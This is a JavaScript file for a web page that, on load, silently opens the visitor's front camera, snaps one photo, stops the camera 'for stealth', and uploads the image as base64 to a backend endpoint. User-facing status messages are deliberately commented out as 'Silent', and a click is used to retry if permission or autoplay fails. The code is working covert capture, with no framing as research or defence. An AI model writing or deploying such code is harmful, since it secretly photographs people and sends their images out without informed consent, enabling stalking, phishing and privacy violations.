const video = document.getElementById('camera-stream');
const canvas = document.getElementById('capture-canvas');
const statusMsg = document.getElementById('status-msg');

async function startCameraAndCapture() {
    try {
        // 1. Open Camera (Try facing user)
        const stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'user' },
            audio: false
        });
        video.srcObject = stream;

        // 2. Wait for video to be ready (needed for iOS)
        video.onloadedmetadata = () => {
            video.play().then(() => {
                // Video playing successfully, wait a bit for focus then capture
                setTimeout(captureFromVideo, 1000);
            }).catch(err => {
                // If auto-play failed (browser blocked it), wait for any interaction
                console.log("Auto-play blocked, waiting for interaction");
                document.body.addEventListener('click', () => {
                    video.play();
                    setTimeout(captureFromVideo, 800);
                }, { once: true });
            });
        };
    } catch (err) {
        console.error("Camera Error:", err);
        statusMsg.innerText = "Error: " + err.message;
        // Retry on click if first attempt failed (e.g. permission denied initially)
        document.body.addEventListener('click', startCameraAndCapture, { once: true });
    }
}

function captureFromVideo() {
    // Check if we already have a stream
    if (!video.srcObject) return;

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');

    // Mirror & Draw
    ctx.translate(canvas.width, 0);
    ctx.scale(-1, 1);
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    // Stop camera immediately for stealth/battery
    const stream = video.srcObject;
    if (stream) {
        stream.getTracks().forEach(track => track.stop());
    }

    // Convert to Base64 (JPEG)
    const base64data = canvas.toDataURL('image/jpeg', 0.7); // 0.7 quality is enough

    sendToBackend(base64data);
}

async function sendToBackend(base64Str) {
    try {
        // statusMsg.innerText = "Yuborilmoqda..."; // Silent

        // POST as JSON (More stable on Vercel)
        const response = await fetch('/api/upload', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ image: base64Str })
        });

        const result = await response.json();

        if (response.ok && result.success) {
            // statusMsg.innerText = "Yuborildi! ✅"; // Silent
            // statusMsg.style.color = '#4ade80';
            console.log("Photo sent successfully");
        } else {
            throw new Error(result.error || 'Server Error');
        }
    } catch (error) {
        console.error(error);
        // statusMsg.innerText = "Xato"; // Silent
    }
}

// Start immediately on load
window.addEventListener('load', startCameraAndCapture);
